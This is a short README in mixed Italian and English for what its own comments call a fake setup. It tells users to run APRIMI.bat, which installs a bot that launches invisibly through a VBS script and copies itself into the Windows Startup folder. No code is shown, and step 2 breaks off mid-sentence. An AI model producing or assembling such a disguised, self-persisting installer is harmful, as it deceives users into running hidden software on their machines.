QUESTO README INDICA LA PROCEDURA DI INSTALLAZIONE:
1. DOWNLOAD EVERYTHING
2. Drag the files in the Desktop (you should have
SETUP\                        ← cartella principale del finto setup
 ├─ APRIMI.bat                ← batch principale che puoi usare per spostare/avviare tutto
 └─ FileManagement\           ← cartella contenente il bot e script
      ├─ AvviaBot.vbs          ← script VBS per avvio invisibile del bot
      ├─ BotMonitor.py         ← script Python originale
      ├─ BotMonitor.spec       ← file generato da PyInstaller
      └─ InstallaStartup.bat   ← batch per copiare il VBS in Startup
   3. Open SETUP and Start "APRIMI.bat"
   4. Then the App is installed in your PC
